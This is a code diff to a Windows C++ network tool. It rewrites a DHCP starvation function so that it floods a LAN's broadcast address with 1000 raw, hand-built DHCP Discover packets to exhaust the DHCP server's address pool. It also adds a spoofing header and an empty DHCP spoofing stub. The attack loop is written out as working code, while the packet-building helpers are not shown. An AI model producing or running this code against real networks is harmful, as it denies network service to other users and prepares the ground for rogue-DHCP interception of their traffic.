@@ -1,12 +1,12 @@
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-#include "Packets.h"
+#include "Headers.h"
 #include "Utils.h"
+#include "Spoofing.h"
 
+#include <time.h>
 #include <iostream>
-#include <winsock2.h>
-#include <Windows.h>
 #include <WS2tcpip.h>
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
@@ -20,6 +20,10 @@ void startDHCPStarvation(AddressInfo& info)
 	sockaddr_in dst;
 	int optval = 1;
 
+	dst.sin_family = AF_INET;
+	dst.sin_port = htons(67);								/* difine the destination */
+	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);
+
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket
 
 #if _DEBUG
@@ -28,43 +32,25 @@ void startDHCPStarvation(AddressInfo& info)
 #endif
 
 	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
+	for (int i = 0; i < 1000; i++)
+	{
+		char* raw_packet = new char[65536];
+		CreateDHCPDiscoverPacket(raw_packet, info);
 
-	dst.sin_family = AF_INET;
-	dst.sin_port = htons(67);								/* difine the destination */
-	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);
-
-	char* raw_packet = new char[65536];
-
-	CreateDHCPDiscoverPacket(raw_packet, info);
-
-	sendto(
-		s,
-		raw_packet,
-		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header) ,
-		0, (sockaddr*)&dst, 
-		sizeof(dst)
-	);
-	delete[] raw_packet;
+		sendto(
+			s,
+			raw_packet,
+			sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
+			0, (sockaddr*)&dst,
+			sizeof(dst)
+		);
+		delete[] raw_packet;
+		Sleep(20);
+	}
 }
 
-int main()
+
+void startDHCPSpoofing(AddressInfo& info)
 {
-	WSADATA wsock;
-	WSAStartup(MAKEWORD(2, 2), &wsock);
-
-	AddressInfo info{};
-	getAddrInfo(&info);
-
-#if _DEBUG
-	std::cout << 
-		info.hostName 
-		<< "\n" << 
-		info.ipv4 
-		<< "\n" << 
-		info.netmask 
-		<< "\n" << 
-		info.broadcast 
-		<< std::endl;
-#endif
-	startDHCPStarvation(info);
+	
 }
